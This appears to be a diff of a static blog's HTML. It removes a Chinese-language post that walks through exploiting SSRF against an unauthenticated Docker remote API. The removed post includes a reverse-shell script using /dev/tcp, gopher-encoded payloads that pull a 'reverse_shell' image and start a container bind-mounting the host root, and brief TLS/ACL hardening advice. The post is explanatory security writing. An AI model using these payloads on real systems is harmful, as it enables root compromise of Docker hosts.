minutes&quot;,&quot;HostConfig&quot;:&#123;&quot;NetworkMode&quot;:&quot;default&quot;&#125;,&quot;NetworkSettings&quot;:&#123;&quot;Networks&quot;:&#123;&quot;bridge&quot;:&#123;&quot;IPAMConfig&quot;:null,&quot;Links&quot;:null,&quot;Aliases&quot;:null,&quot;NetworkID&quot;:&quot;9a8a2dd6afbbc355194a5fd224757ac8fe11760dbfde91c07c46689146e15089&quot;,&quot;EndpointID&quot;:&quot;a079ba4ac68eafb5add6b56822dd13a288ca059a815e7a011e82bdcb8fd8542b&quot;,&quot;Gateway&quot;:&quot;172.17.0.1&quot;,&quot;IPAddress&quot;:&quot;172.17.0.4&quot;,&quot;IPPrefixLen&quot;:16,&quot;IPv6Gateway&quot;:&quot;&quot;,&quot;GlobalIPv6Address&quot;:&quot;&quot;,&quot;GlobalIPv6PrefixLen&quot;:0,&quot;MacAddress&quot;:&quot;02:42:ac:11:00:04&quot;,&quot;DriverOpts&quot;:null&#125;&#125;&#125;,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/&quot;,&quot;Destination&quot;:&quot;/hostOS&quot;,&quot;Mode&quot;:&quot;&quot;,&quot;RW&quot;:true,&quot;Propagation&quot;:&quot;rslave&quot;&#125;]&#125;,]</span><br></pre></td></tr></table></figure>
-<p>我们可以先构造一个特殊的docker镜像，并将之上传到DockerHub</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:14.04</span><br><span class="line">COPY exploit.sh /exploit.sh</span><br><span class="line">ENTRYPOINT [&quot;/bin/bash&quot;, &quot;exploit.sh&quot;]</span><br></pre></td></tr></table></figure>
-<p>这里我们的exploit.sh的写法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/$1/$2 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>这里的docker镜像已经上传到了<a href="https://hub.docker.com/r/imagemlt/reverse_shell/">dockerhub</a>。</p>
-<p>之后我们可以先构造合适的post封包：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/images/create?fromImage=imagemlt/reverse_shell HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">X-Registry-Auth: e30=</span><br></pre></td></tr></table></figure>
-<p>这个post封包的目标是让远程主机从dockerhub下载我们需要的镜像。构造为gopher格式为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/images/create%3FfromImage%3Dimagemlt/reverse_shell%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%200%0AContent-Type%3A%20text/plain%0A X-Registry-Auth:%20e30%3D%0A%0A</span><br></pre></td></tr></table></figure>
-<p>通过ssrf的点触发即可在远程服务器下载我们的镜像。<img src="http://image.3001.net/images/20180806/1533549895_5b681d4734a8a.png!small" alt="pull.png"></p>
-<p><img src="./pull.png" alt></p>
-<p>之后再创建容器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/create HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;Cmd&quot;:[&quot;your ip&quot;,&quot;3456&quot;],&quot;Image&quot;:&quot;imagemlt/reverse_shell&quot;,&quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/hostOS&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>将封包包装为gopher的形式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/containers/create%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%2099%0AContent-Type%3A%20application/json%0A%0A%7B%22Cmd%22%3A%5B%22your ip%22%2C%223456%22%5D%2C%22Image%22%3A%22imagemlt/reverse_shell%22%2C%22HostConfig%22%3A%7B%22Binds%22%3A%5B%22/%3A/hostOS%22%5D%7D%7D%0A%0d%0a</span><br></pre></td></tr></table></figure>
-<p>这里我们再最后多加了一些%0d%0a从而让连接能够断开。然后利用之前的ssrf的地方请求这个url，可以获得创建的容器id：<img src="http://image.3001.net/images/20180806/1533549978_5b681d9a90183.png!small" alt="create.png"></p>
-<p><img src="./create.png" alt></p>
-<p>获取id后我们再post相应的使容器运行的封包：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/5a42a09f7bb889f53943015346682388d40a151ec5bad30024282eee11811380/start HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
-<p>我们的服务器端nc端口3456，构造gopher格式的url候再次发送封包：</p>
-<p><img src="http://image.3001.net/images/20180806/1533550032_5b681dd030497.png!small" alt="attack.png"><img src="http://image.3001.net/images/20180806/1533550043_5b681ddb80ec8.png!small" alt="getshell.png"></p>
-<p><img src="./attack.png" alt>可以看到服务器端成功返回shell，且已成功挂载宿主机根目录到/hostOS下。</p>
-<p><img src="./getshell.png" alt></p>
-<p>这样我们便通过ssrf与docker未授权api完成了一次攻击，并且获取了宿主机的root权限！</p>
-<p>除了反弹shell的方法，我们也可以借助写crontab的方法来获得最后的shell，这里便不再赘述。</p>
-<h2 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h2><p>在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p>
-<ul>
-<li><p>设置ACL，仅允许信任的来源IP连接；</p>
-</li>
-<li><p>设置TLS认证，官方的文档为Protect the Docker daemon socket</p>
-</li>
-</ul>
-<p>客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://10.10.10.10:2375 -H unix:///var/run/docker.sock</span><br></pre></td></tr></table></figure>
-<p>客户端连接时需要设置以下环境变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export DOCKER_TLS_VERIFY=1</span><br><span class="line">export DOCKER_CERT_PATH=~/.docker</span><br><span class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</span><br><span class="line">export DOCKER_API_VERSION=1.12</span><br></pre></td></tr></table></figure>
-<p>这样便可以避免未授权的docker api被远程利用。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>未授权的docker remote api具有极大的风险，当结合ssrf漏洞时可以作为渗透测试扩展供给面的工具，最后获得root shell.因此我们做开发时应该严格防范。最后总结一下我们的攻击思路：</p>
-<p><img src="http://image.3001.net/images/20180806/1533550066_5b681df2b82f9.png!small" alt="flow.png"></p>
-<p><img src="./flow.png" alt></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a href="https://sec.xiaomi.com/article/22">https://sec.xiaomi.com/article/22</a></li>
-<li><a href="http://dockone.io/article/401">http://dockone.io/article/401</a></li>
-<li><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2405,7 +2330,7 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-count">60</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
